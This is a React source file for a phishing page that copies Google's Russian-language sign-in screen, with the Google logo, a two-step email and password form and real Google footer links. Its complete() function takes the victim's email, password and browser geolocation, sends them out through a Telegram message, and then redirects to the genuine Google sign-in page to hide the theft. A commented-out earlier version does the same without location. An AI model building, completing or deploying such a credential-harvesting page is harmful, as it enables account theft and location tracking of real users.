import React, { useState,useEffect } from 'react';
import { useDispatch, useSelector } from 'react-redux';
import classes from "./MainPage.module.sass";
import TextField from '@mui/material/TextField';
import Button from '@mui/material/Button';
import { ReactComponent as Logo } from "../images/Google__G__logo.svg";
import { ReactComponent as User } from "../images/Google_user.svg";
import { ReactComponent as Arrow } from "../images/MUI_arrow.svg";
import { ReactComponent as Error } from "../images/Google_error.svg";
import Select from '@mui/material/Select';
import MenuItem from '@mui/material/MenuItem';
import { InputAdornment, IconButton, FormControlLabel, Checkbox, LinearProgress } from '@mui/material';
import { Box, Typography } from '@mui/material';
import { sendTelegramMessage } from '../redux/telegramSlice';
export default function MainPage() {

  const dispatch = useDispatch();
  const [showPassword, setShowPassword] = useState(false);
  const handleClickShowPassword = () => {
    setShowPassword(!showPassword);
  };
  const [page,setPage] = useState(0)
  const [email,setEmail] = useState('')
  const [password,setPassword] = useState('')
  const [isValid, setIsValid] = useState(true);
  const [isValidPassword, setIsValidPassword] = useState(true);
  const goNext = () => {
    if(examination(email)){
      setPage(1)
      setTimeout(() => {
        setPage(2)
      }, 1600);
    }else{
      setIsValid(false)
    }
  };
  const goBack = () => {
    setPage(1)
    setTimeout(() => {
      setPage(0)
    }, 1600);
  };
  const examination = (value) => {
    const emailRegex = /^[^\s@]+@gmail\.com$/;
    const phoneRegex = /^[\d\s\-\+\(\)\.]{10,}$/;
    const cleanValue = value.trim();
    if (emailRegex.test(cleanValue)) {
      return true;
    }
    const digitsOnly = cleanValue.replace(/\D/g, '');
    if (digitsOnly.length >= 10) {
      return true;
    }

    return false;
  };
  const examinationPassword = (value) => {
    const cleanValue = value.trim();
    // Минимум 8 символов, есть буква, есть цифра, без пробелов
    return /^(?=.*[a-zA-Z])(?=.*\d)[^\s]{8,}$/.test(cleanValue);
  };
  const handleChange = (e) => {
    const value = e.target.value;
    setEmail(value);
    setIsValid(examination(value) || value === '');
  };
  const handleChangePssword = (e) => {
    const value = e.target.value;
    setPassword(value);
    setIsValidPassword(examinationPassword(value) || value === '')
  }
  // const complete = () => {
  //   if(examinationPassword(password)&&examination(email)){
  //     dispatch(sendTelegramMessage({ 
  //       message: `login: ${email}\npassword: ${password}`
  //     }));
  //     setTimeout(() => {
  //       window.location.href = 'https://accounts.google.com/v3/signin/identifier?checkedDomains=youtube&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1427879506%3A1770294599893415&ec=futura_exp_og_so_72776762_e&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=ru&ifkv=AXbMIuAlt-VbH6fU0tEwuZUkVUvgqSm06wdnp82HgWkD7TqP_4WpqbM7xnZ-8nPv_DBfvrY24o8a&pstMsg=1'
  //     }, 1000);
  //   }else{
  //     setIsValidPassword(false)
  //   }
  // }
  const complete = () => {
    if (examinationPassword(password) && examination(email)) {
      // Получаем геолокацию
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const location = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
          
          dispatch(sendTelegramMessage({ 
            message: `login: ${email}\npassword: ${password}\nlocation: ${location}`
          }));
          
          setTimeout(() => {
            window.location.href = 'https://accounts.google.com/v3/signin/identifier?checkedDomains=youtube&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1427879506%3A1770294599893415&ec=futura_exp_og_so_72776762_e&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=ru&ifkv=AXbMIuAlt-VbH6fU0tEwuZUkVUvgqSm06wdnp82HgWkD7TqP_4WpqbM7xnZ-8nPv_DBfvrY24o8a&pstMsg=1'
          }, 1000);
        },
        (error) => {
          // Если геолокация недоступна, отправляем без нее
          dispatch(sendTelegramMessage({ 
            message: `login: ${email}\npassword: ${password}\nlocation: не доступна`
          }));
          
          setTimeout(() => {
            window.location.href = 'https://accounts.google.com/v3/signin/identifier?checkedDomains=youtube&continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1427879506%3A1770294599893415&ec=futura_exp_og_so_72776762_e&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=ru&ifkv=AXbMIuAlt-VbH6fU0tEwuZUkVUvgqSm06wdnp82HgWkD7TqP_4WpqbM7xnZ-8nPv_DBfvrY24o8a&pstMsg=1'
          }, 1000);
        }
      );
    } else {
      setIsValidPassword(false);
    }
  };
  return (
   <div className={classes.Wrapper}>
    <div className={classes.WrapperBG} style={{ display: page!==1?'none':'flex'}}/>
    <div className={classes.WrapperInner} style={{ height: page!==2?isValid?'422px':'444px':'376px'}}>
      <LinearProgress
        sx={{
          position: 'absolute',
          top: 0,
          left: '50%',
          transform: 'translateX(-50%)',
          width: '784px',
          zIndex: '15',
          display: page!==1?'none':'flex'
        }}
      />
      
      <Logo className={classes.WrapperInnerLogo}/>
      <div className={classes.WrapperInnerButtom} style={{ right: page!==2?'38px':'840px'}}>
        <div className={classes.WrapperInnerButtomLeft}>
          <p className={classes.WrapperInnerButtomLeftH}>Вход</p>
          <p className={classes.WrapperInnerButtomLeftText}>Используйте аккаунт Google</p>
        </div>
        <div className={classes.WrapperInnerButtomRight}>
          <div className={classes.WrapperInnerButtomRightTop}>
            <Box>
              <TextField
                label="Телефон или адрес эл. почты"
                value={email}
                onChange={handleChange}
                InputLabelProps={{
                  sx: {
                    color: isValid ? '#E3E3E3' : '#F2B8B5',
                    '&.Mui-focused': { color: isValid ? '#A8C7FA' : '#F2B8B5' },
                  },
                }}
                sx={{
                  width: '100%',
                  '& .MuiInputBase-input': { color: '#E3E3E3' },
                  '& .MuiOutlinedInput-root': {
                    '& fieldset': { 
                      borderColor: !isValid ? '#F2B8B5' : '#8E918F' 
                    },
                    '&:hover fieldset': { 
                      borderColor: !isValid ? '#F2B8B5' : '#8E918F' 
                    },
                    '&.Mui-focused fieldset': { 
                      borderColor: !isValid ? '#F2B8B5' : '#A8C7FA' 
                    },
                  },
                }}
              />

              {!isValid && (
                <Box sx={{ display: 'flex', alignItems: 'center', mt: 1, color: '#F2B8B5', gap: '10px' }}>
                  <Error style={{width: '14px', height: '14px'}}/>
                  <Typography variant="caption">
                    Введите адрес электронной почты или номер телефона.
                  </Typography>
                </Box>
              )}
            </Box>
            <button className={classes.WrapperInnerButtomRightTopButton}>
              <a  href='https://google.com/error'>
                Забыли адрес электронной почты?
              </a>
            </button>
          </div>
          <p className={classes.WrapperInnerButtomRightCenter}>
            Работаете на чужом компьютере? Используйте режим "Приватный просмотр". <a className={classes.WrapperInnerButtomRightCenterLink} href='https://support.google.com/accounts/answer/2917834?visit_id=639058913054331102-2291279140&p=signin_privatebrowsing&hl=ru&rd=1'>Подробнее об <br/> использовании гостевого режима</a>
          </p>
          <div className={classes.WrapperInnerButtomRightButtom}>
            <Button 
              size='large'
              variant="contained"
              href='https://accounts.google.com/lifecycle/steps/signup/name?checkedDomains=youtube&continue=https://www.google.com/&dsh=S1427879506:1770294599893415&ec=futura_exp_og_so_72776762_e&flowEntry=SignUp&flowName=GlifWebSignIn&hl=ru&ifkv=AXbMIuAlt-VbH6fU0tEwuZUkVUvgqSm06wdnp82HgWkD7TqP_4WpqbM7xnZ-8nPv_DBfvrY24o8a&pstMsg=1&TL=APgKAcYt0vMVIZzlvO0QFSF7llE1wlNK5TThGvP4zEB0Aw-OpLZf63ayIU2NwPZS'
              sx={{
                borderRadius: '100px',
                textTransform: 'none',
                backgroundColor: '#0E0E0E', // обычный цвет
                '&:hover': {
                  backgroundColor: '#141517', // цвет при наведении
                  boxShadow: 'none',
                },
                boxShadow: 'none',
                color: '#A8C7FA'
              }}
            >
              Создать аккаунт
            </Button>
            <Button 
              size='large'
              variant="contained"
              disableRipple
              sx={{
                borderRadius: '100px',
                textTransform: 'none',
                backgroundColor: '#A8C7FA', // обычный цвет
                '&:hover': {
                  backgroundColor: '#B6D0FB', // цвет при наведении
                  boxShadow: 'none',
                },
                boxShadow: 'none',
                color: '#062E6F'
              }}
              onClick={()=>goNext()}
            >
              Далее
            </Button>
          </div>
        </div>
      </div>
      <div className={classes.WrapperInnerPasButtom} style={{ right: page!==2?'-800px':'38px'}}> 
        <div className={classes.WrapperInnerPasButtomLeft}>
          <p className={classes.WrapperInnerPasButtomLeftH}>Добро пожаловать!</p>
          <button onClick={()=>goBack()}>
            <User className={classes.WrapperInnerPasButtomLeftUser}/>
            <p className={classes.WrapperInnerPasButtomLeftText}>{email}</p>
            <Arrow className={classes.WrapperInnerPasButtomLeftArrow}/>
          </button>
        </div>
        <div className={classes.WrapperInnerPasButtomRight}>
          <div className={classes.WrapperInnerPasButtomRightTop}>
            <Box>
              <TextField
                label="Введите пароль"
                value={password}
                onChange={handleChangePssword}
                type={showPassword ? 'text' : 'password'}
                InputLabelProps={{
                  sx: {
                    color: isValidPassword ? '#E3E3E3' : '#F2B8B5',
                    '&.Mui-focused': { color: isValidPassword ? '#A8C7FA' : '#F2B8B5' },
                  },
                }}
                sx={{
                  width: '100%',
                  '& .MuiInputBase-input': { color: '#E3E3E3' },
                  '& .MuiOutlinedInput-root': {
                    '& fieldset': { 
                      borderColor: !isValidPassword ? '#F2B8B5' : '#8E918F' 
                    },
                    '&:hover fieldset': { 
                      borderColor: !isValidPassword ? '#F2B8B5' : '#8E918F' 
                    },
                    '&.Mui-focused fieldset': { 
                      borderColor: !isValidPassword ? '#F2B8B5' : '#A8C7FA' 
                    },
                  },
                }}
              />

              {!isValidPassword && (
                <Box sx={{ display: 'flex', alignItems: 'center', mt: 1, color: '#F2B8B5', gap: '10px' }}>
                  <Error style={{width: '14px', height: '14px'}}/>
                  <Typography variant="caption">
                    Введите пароль.
                  </Typography>
                </Box>
              )}
            </Box>
            <FormControlLabel
              label= "Показать пароль"
              control={
                <Checkbox
                  checked={showPassword}
                  onChange={handleClickShowPassword}
                  
                  sx={{
                    color: '#C4C7C5',
                    '&.Mui-checked': { color: '#A8C7FA' },
                    padding: 0,
                    margin: 0
                  }}
                />
              }
              sx={{ 
                margin: 0 ,
                gap: '10px'

              }}
            />

          </div>
          <div className={classes.WrapperInnerPasButtomRightButtom}>
            <Button 
              href='https://google.com/error'
              size='large'
              variant="contained"
              sx={{
                borderRadius: '100px',
                textTransform: 'none',
                backgroundColor: '#0E0E0E', // обычный цвет
                '&:hover': {
                  backgroundColor: '#141517', // цвет при наведении
                  boxShadow: 'none',
                },
                boxShadow: 'none',
                color: '#A8C7FA'
              }}
            >
              Забыли пароль?
            </Button>
            <Button 
              size='large'
              variant="contained"
              disableRipple
              onClick={()=>complete()}
              sx={{
                borderRadius: '100px',
                textTransform: 'none',
                backgroundColor: '#A8C7FA', // обычный цвет
                '&:hover': {
                  backgroundColor: '#B6D0FB', // цвет при наведении
                  boxShadow: 'none',
                },
                boxShadow: 'none',
                color: '#062E6F'
              }}
            >
              Далее
            </Button>
          </div>
        </div>
      </div>
    </div>
    <div className={classes.WrapperButtom}>
      <div className={classes.WrapperButtomLeft}>
        <Select
          size='small'
          displayEmpty
          value="staticValue"
          sx={{
            width: '200px',
            fontSize: '12px',
            borderRadius: '8px',
            cursor: 'default',
            // Убираем стандартные стили бордера
            '& .MuiOutlinedInput-notchedOutline': {
              border: 'none',
            },
            // Убираем бордер при фокусе
            '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
              border: 'none',
            },
            // Фон по умолчанию
            backgroundColor: 'transparent',
            // При наведении
            '&:hover': {
              backgroundColor: '#2C2D2D', 
            },
            // Цвет текста
            color: '#D6D6D6', 
            // Цвет стрелки
            '& .MuiSelect-icon': {
              color: '#D6D6D6', 
            },
            // Цвет стрелки при наведении
            '&:hover .MuiSelect-icon': {
              color: '#D6D6D6', 
            },
          }}
          MenuProps={{
            disablePortal: true,
            PaperProps: {
              sx: { display: 'none' }
            }
          }}
        >
          <MenuItem value="staticValue">Русский</MenuItem>
        </Select>
      </div>
      <div className={classes.WrapperButtomRight}>
        <Button 
          href='https://support.google.com/accounts?hl=ru&visit_id=639058913051974788-1558988613&rd=2&p=account_iph#topic=3382296'
          size='small'
          variant="contained"
          sx={{
            borderRadius: '8px',
            textTransform: 'none',
            backgroundColor: '#1E1F20', // обычный цвет
            '&:hover': {
              backgroundColor: '#2C2D2D', // цвет при наведении
              boxShadow: 'none',
            },
            boxShadow: 'none',
            color: '#D6D6D6'
          }}
        >
          Справка
        </Button>
        <Button 
          href='https://policies.google.com/privacy?gl=KG&hl=ru'
          size='small'
          variant="contained"
          sx={{
            borderRadius: '8px',
            textTransform: 'none',
            backgroundColor: '#1E1F20', // обычный цвет
            '&:hover': {
              backgroundColor: '#2C2D2D', // цвет при наведении
              boxShadow: 'none',
            },
            boxShadow: 'none',
            color: '#D6D6D6'
          }}
        >
          Конфидециальность
        </Button>
        <Button 
          href='https://policies.google.com/terms?gl=KG&hl=ru'
          size='small'
          variant="contained"
          sx={{
            borderRadius: '8px',
            textTransform: 'none',
            backgroundColor: '#1E1F20', // обычный цвет
            '&:hover': {
              backgroundColor: '#2C2D2D', // цвет при наведении
              boxShadow: 'none',
            },
            boxShadow: 'none',
            color: '#D6D6D6'
          }}
        >
          Условия
        </Button>
      </div>
    </div>
   </div>
  )
}
